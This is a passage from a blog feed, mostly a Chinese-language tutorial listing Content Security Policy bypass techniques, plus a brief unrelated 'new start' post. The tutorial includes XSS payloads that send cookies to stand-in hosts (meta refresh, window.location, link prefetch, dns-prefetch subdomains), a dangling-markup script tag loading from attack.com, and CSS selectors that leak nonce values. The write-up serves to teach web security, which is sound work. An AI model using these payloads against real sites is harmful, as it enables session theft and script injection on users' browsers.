class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure><p>SD意味着可信js生成的js代码是可信的。</p><p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p><h2 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h2><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><p>接下来的多种Bypass手段也是围绕这两种的</p><h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><p>利用url跳转，回避严格的CSP。</p><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.location=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>\&lt;a>标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $(#foo).click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"foo"</span> <span class="attr">href</span>=<span class="string">"xxxxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用网站本身的跳转接口</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h3 id="lt-link-标签预加载"><a href="#lt-link-标签预加载" class="headerlink" title="\&lt;link>标签预加载"></a>\&lt;link>标签预加载</h3><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>link标签除了这两种rel，还有preconnect、prerender、subresource、preload等</p><h3 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h3><p>有些网站限制只有某些脚本才能使用，往往会使用\&lt;script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure><p>那么当脚本插入点为如下的情况时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以插入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p>这里利用浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a>利用DOM XSS</h3><p>如果JS存在操作location.hash导致的XSS，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。可以见下面lorexxar师傅的博文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>如果有DOM操作可以插入HTML并且可以控制插入的HTML内容，那么也可以绕过CSP</p><h3 id="利用CSS-静态xss-获取nonce值"><a href="#利用CSS-静态xss-获取nonce值" class="headerlink" title="利用CSS 静态xss 获取nonce值"></a>利用CSS 静态xss 获取nonce值</h3><p>利用CSS选择器来逐字节获取信息，^=从头部判断</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br></pre></td></tr></table></figure><p>比如确定第一位为c，那么就会继续下面的步骤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="ca"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ca"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cb"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cb"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cc"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>由于是CSS的变化，没有引起服务器重新请求，所以nonce的值不会改变，偷取值后即可执行我们的script</p><h3 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a>利用跨域传输数据</h3><p>利用一些跨域传输的方法来引入JS，导致执行</p><p>具体的可以看看呆子不开口的乌云大会PPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>和0CTF2018预选赛中的h4xors.club2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h3 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a>利用文件上传执行JS</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'self'</span><br></pre></td></tr></table></figure><p>针对只能加载同域下script的CSP策略，如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p><p>可以参考前几天梅子酒师傅写的上传Wave文件绕过CSP，执行JS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h3 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h3><p>利用base标签改变资源加载的域，从而引入恶意的js，造成js执行</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>可以看到CSP的绕过比较看重实际场景，不同的情况下有着不同的绕过方法。</p><p>作者能力有限，如果文章中有什么问题，欢迎交流。最后，恭喜RNG！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/09/CSP%20Is%20Dead,%20Long%20Live%20CSP!%20On%20the%20Insecurity%20of%20Whitelists%20and%20the%20Future%20of%20Content%20Security%20Policy/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/10/25/csp-paper/#0x02-CSP%EF%BC%88Content-Security-Policy%EF%BC%89</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/f1de775bc43e</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line"></span><br><span class="line">http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发在信安之路上 &lt;a href=&quot;https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/z_XmhrTUg_
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CSP" scheme="https://hurricane618.me/tags/CSP/"/>
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>新的开始</title>
    <link href="https://hurricane618.me/2018/06/26/new-start/"/>
    <id>https://hurricane618.me/2018/06/26/new-start/</id>
    <published>2018-06-26T03:10:58.000Z</published>
    <updated>2018-07-19T01:05:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。</p><p>一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。</p><img src="/2018/06/26/new-start/67863722_p0.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。&lt;/p&gt;
&lt;p&gt;一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。&lt;/p&gt;
&lt;img src=&quot;/2018/06/26/new-start/
      
    
    </summary>
    
      <category term="杂谈" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="闲聊" scheme="https://hurricane618.me/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
</feed>
